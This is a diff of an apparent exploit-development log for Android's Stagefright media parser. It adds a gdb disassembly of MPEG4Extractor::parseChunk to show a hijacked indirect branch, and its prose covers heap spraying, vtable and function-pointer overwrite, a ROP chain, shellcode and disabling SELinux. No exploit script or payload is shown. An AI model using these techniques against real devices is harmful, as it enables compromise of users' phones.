@@ -58,6 +58,44 @@ Adjusted them .... + 8 bytes
 
 Now in the original version of the exploit (G0) I happened to land 28 bytes further (+28 offset) of vtable pointer in my sprayed heap, that should be readAt function address .... but in the original version NOPs were on the heap ... so I changed it to only 28 NOPs and started my ROP Chain/Stack right away
 
+Here is the assembly, see at the bottom. It is branching to value of offset +28 bytes:
+
+```asm
+(gdb) disass 0xb66e1042
+Dump of assembler code for function _ZN7android14MPEG4Extractor10parseChunkEPxi:
+   0xb66e0ff8 <+0>: stmdb   sp!, {r4, r5, r6, r7, r8, r9, r10, r11, lr}
+   0xb66e0ffc <+4>: vpush   {d8}
+   0xb66e1000 <+8>: mov r6, r0
+   0xb66e1002 <+10>:    ldr.w   r8, [pc, #708]  ; 0xb66e12c8 <_ZN7android14MPEG4Extractor10parseChunkEPxi+720>
+   0xb66e1006 <+14>:    mov r9, r1
+   0xb66e1008 <+16>:    ldr r3, [pc, #704]  ; (0xb66e12cc <_ZN7android14MPEG4Extractor10parseChunkEPxi+724>)
+   0xb66e100a <+18>:    sub sp, #444    ; 0x1bc
+   0xb66e100c <+20>:    add r8, pc
+   0xb66e100e <+22>:    add r7, sp, #120    ; 0x78
+   0xb66e1010 <+24>:    str r2, [sp, #52]   ; 0x34
+   0xb66e1012 <+26>:    ldr.w   r5, [r8, r3]
+   0xb66e1016 <+30>:    ldrd    r2, r3, [r1]
+   0xb66e101a <+34>:    ldr r4, [sp, #52]   ; 0x34
+   0xb66e101c <+36>:    ldr r1, [pc, #688]  ; (0xb66e12d0 <_ZN7android14MPEG4Extractor10parseChunkEPxi+728>)
+   0xb66e101e <+38>:    ldr r0, [r5, #0]
+   0xb66e1020 <+40>:    strd    r2, r3, [sp]
+   0xb66e1024 <+44>:    ldr r2, [pc, #684]  ; (0xb66e12d4 <_ZN7android14MPEG4Extractor10parseChunkEPxi+732>)
+   0xb66e1026 <+46>:    str r4, [sp, #8]
+   0xb66e1028 <+48>:    add r1, pc
+   0xb66e102a <+50>:    str r0, [sp, #436]  ; 0x1b4
+   0xb66e102c <+52>:    movs    r0, #2
+   0xb66e102e <+54>:    add r2, pc
+   0xb66e1030 <+56>:    blx 0xb66bc038 <__android_log_print@plt>
+   0xb66e1034 <+60>:    ldr r0, [r6, #80]   ; 0x50
+   0xb66e1036 <+62>:    movs    r3, #8
+   0xb66e1038 <+64>:    ldr r1, [r0, #0]
+   0xb66e103a <+66>:    str r7, [sp, #0]
+   0xb66e103c <+68>:    str r3, [sp, #4]
+   0xb66e103e <+70>:    ldrd    r2, r3, [r9]
+=> 0xb66e1042 <+74>:    ldr r4, [r1, #28]
+   0xb66e1044 <+76>:    blx r4
+```
+
 
 
 WHOOOO HOOO ... overwrote vtable and function pointer of readAt to my ROP chain/stack ... and the ROP chain seem to work ... but it stucks on executing shellcode wanted to write a file .... problem seem to be SELinux (seems that mediaserver is sandboxed). Disabled it.
